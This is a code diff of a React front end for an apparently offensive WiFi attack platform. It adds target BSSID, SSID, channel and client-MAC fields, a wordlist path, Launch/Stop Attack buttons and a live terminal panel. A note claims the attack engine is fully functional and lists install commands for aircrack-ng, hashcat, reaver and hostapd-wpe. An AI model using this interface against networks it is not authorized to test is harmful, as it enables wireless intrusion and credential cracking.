+                  <div className="space-y-1">
+                    <Label className="text-xs">Target BSSID (MAC)</Label>
+                    <Input value={bssid} onChange={e => setBssid(e.target.value)} disabled={active} className="h-8 text-xs font-mono" placeholder="AA:BB:CC:DD:EE:FF" data-testid="input-wifi-bssid" />
                   </div>
-                ))}
+                )}
+
+                {fields.includes("ssid") && (
+                  <div className="space-y-1">
+                    <Label className="text-xs">Target SSID</Label>
+                    <Input value={ssid} onChange={e => setSsid(e.target.value)} disabled={active} className="h-8 text-xs font-mono" placeholder="NetworkName" data-testid="input-wifi-ssid" />
+                  </div>
+                )}
+
+                {fields.includes("channel") && (
+                  <div className="space-y-1">
+                    <Label className="text-xs">Channel {selectedMode.id === "scan" ? "(blank = all)" : ""}</Label>
+                    <Input value={channel} onChange={e => setChannel(e.target.value)} disabled={active} className="h-8 text-xs font-mono" placeholder="1-14" data-testid="input-wifi-channel" />
+                  </div>
+                )}
+
+                {fields.includes("clientMac") && (
+                  <div className="space-y-1">
+                    <Label className="text-xs">Client MAC <span className="text-muted-foreground">(FF:FF:... = broadcast)</span></Label>
+                    <Input value={clientMac} onChange={e => setClientMac(e.target.value)} disabled={active} className="h-8 text-xs font-mono" placeholder="FF:FF:FF:FF:FF:FF" data-testid="input-wifi-client" />
+                  </div>
+                )}
+
+                {fields.includes("wordlist") && (
+                  <div className={`space-y-1 ${fields.length > 4 ? "col-span-2 md:col-span-2" : ""}`}>
+                    <Label className="text-xs">Wordlist Path</Label>
+                    <Input value={wordlist} onChange={e => setWordlist(e.target.value)} disabled={active} className="h-8 text-xs font-mono" placeholder="/usr/share/wordlists/rockyou.txt" data-testid="input-wifi-wordlist" />
+                  </div>
+                )}
+              </div>
+
+              {/* Duration slider */}
+              <div className="space-y-2">
+                <div className="flex items-center justify-between">
+                  <Label className="text-xs">Duration</Label>
+                  <span className="text-xs font-mono text-primary">{duration}s</span>
+                </div>
+                <Slider
+                  value={[duration]} onValueChange={([v]) => setDuration(v)}
+                  min={10} max={600} step={10} disabled={active}
+                  data-testid="slider-wifi-duration"
+                  className="w-full"
+                />
+                <div className="flex justify-between text-[10px] text-muted-foreground">
+                  <span>10s</span><span>5 min</span><span>10 min</span>
+                </div>
+              </div>
+
+              {/* Launch / Stop buttons */}
+              <div className="flex items-center gap-3">
+                {!active ? (
+                  <Button
+                    onClick={handleLaunch}
+                    disabled={launching || !iface.trim()}
+                    className="flex-1 h-9 bg-primary hover:bg-primary/90 text-primary-foreground"
+                    data-testid="button-wifi-launch"
+                  >
+                    {launching
+                      ? <><Loader2 className="w-4 h-4 me-2 animate-spin" />Launching...</>
+                      : <><Play className="w-4 h-4 me-2" />Launch Attack</>
+                    }
+                  </Button>
+                ) : (
+                  <Button
+                    onClick={handleStop}
+                    disabled={stopping}
+                    variant="destructive"
+                    className="flex-1 h-9"
+                    data-testid="button-wifi-stop"
+                  >
+                    {stopping
+                      ? <><Loader2 className="w-4 h-4 me-2 animate-spin" />Stopping...</>
+                      : <><Square className="w-4 h-4 me-2" />Stop Attack</>
+                    }
+                  </Button>
+                )}
+                {jobId && !active && (
+                  <Button
+                    variant="outline" size="sm"
+                    onClick={() => { setJobId(null); setJobStatus(null); outputRef.current = []; }}
+                    data-testid="button-wifi-reset"
+                    className="h-9"
+                  >
+                    <RefreshCw className="w-3.5 h-3.5 me-1.5" />
+                    Reset
+                  </Button>
+                )}
               </div>
             </CardContent>
           </Card>
+
+          {/* Live terminal output */}
+          {jobId && (
+            <Card>
+              <CardHeader className="pb-2">
+                <CardTitle className="text-xs uppercase tracking-wider flex items-center gap-2">
+                  <Terminal className="w-3.5 h-3.5 text-primary" />
+                  Live Terminal Output
+                  {active && <Activity className="w-3 h-3 text-green-400 animate-pulse" />}
+                  {jobStatus && (
+                    <span className="text-muted-foreground font-normal ml-auto font-mono text-[10px]">
+                      {jobStatus.elapsed}s elapsed | {jobStatus.totalLines} lines
+                    </span>
+                  )}
+                  {jobStatus && (
+                    <CopyBtn text={(jobStatus.output ?? []).join("\n")} />
+                  )}
+                </CardTitle>
+              </CardHeader>
+              <CardContent className="p-0">
+                <TrafficConsole
+                  trafficLog={jobStatus?.output ?? []}
+                  active={active}
+                  title={`${selectedMode.name} — Job ${jobId.slice(0, 8)}`}
+                  className="rounded-t-none border-t-0"
+                />
+              </CardContent>
+            </Card>
+          )}
+
+          {/* Environment note when no tools available */}
+          {!toolsLoading && tools.length > 0 && tools.every(t => !t.available) && !jobId && (
+            <Card className="border-amber-500/30 bg-amber-500/5">
+              <CardContent className="p-4">
+                <div className="flex items-start gap-3">
+                  <WifiOff className="w-4 h-4 text-amber-400 mt-0.5 shrink-0" />
+                  <div className="space-y-1.5">
+                    <p className="text-xs font-semibold text-amber-400">No wireless tools detected in this environment</p>
+                    <p className="text-[10px] text-muted-foreground">
+                      This platform is running in a cloud container without wireless hardware. The attack engine is fully functional — deploy to a Kali Linux / Parrot OS machine with a monitor-mode capable adapter (e.g. Alfa AWUS036ACH) and all attacks will execute in real time.
+                    </p>
+                    <div className="text-[10px] font-mono text-muted-foreground space-y-0.5 mt-2">
+                      <p className="text-amber-400/80">Install on Kali/Parrot:</p>
+                      <p>sudo apt-get install aircrack-ng hcxtools hcxdumptool hashcat reaver hostapd-wpe</p>
+                    </div>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+          )}
+
+          {/* Launch anyway note — show if tools missing but user still wants to try */}
+          {!toolsLoading && tools.length > 0 && tools.some(t => !t.available) && tools.some(t => t.available) && !jobId && (
+            <div className="flex items-start gap-2 rounded-md border border-amber-500/30 bg-amber-500/5 p-2.5">
+              <AlertTriangle className="w-3.5 h-3.5 text-amber-400 mt-0.5 shrink-0" />
+              <p className="text-[10px] text-amber-400">Some required tools are missing. The attack will start but may fail at the missing tool step. Install missing tools and re-launch.</p>
+            </div>
+          )}
         </div>
       </div>
     </div>
